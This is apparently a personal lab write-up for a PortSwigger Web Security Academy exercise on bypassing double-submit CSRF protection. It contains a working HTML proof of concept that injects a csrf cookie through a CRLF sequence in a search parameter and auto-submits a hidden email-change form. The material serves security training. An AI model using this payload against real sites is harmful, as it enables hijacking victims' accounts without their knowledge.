This lab's email change functionality is vulnerable to CSRF. It attempts to use the insecure "double submit" CSRF prevention technique.

To solve the lab, use your exploit server to host an HTML page that uses a [CSRF attack](https://portswigger.net/web-security/csrf) to change the viewer's email address.

# Vuln assessment

Find the cookie-setting functionality:

![[cookie-setting.png]]


# Exploitation

Follow these exploitation steps:

1. Inject the cookie (this time is an arbitrary value of the same length as the original cookie value)
2. Execute the csrf making sure the cookie value and the form parameter match:
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a2700a30459b23c8065bc9f001800fd.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test5&#64;test&#46;com" />
      <input type="hidden" name="csrf" value="umqmNECOMwMfLSqBMQskLfq0XkQF0hzE" />
      <input type="submit" value="Submit request" />
    </form>
   <img src="https://0a2700a30459b23c8065bc9f001800fd.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=umqmNECOMwMfLSqBMQskLfq0XkQF0hzE%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```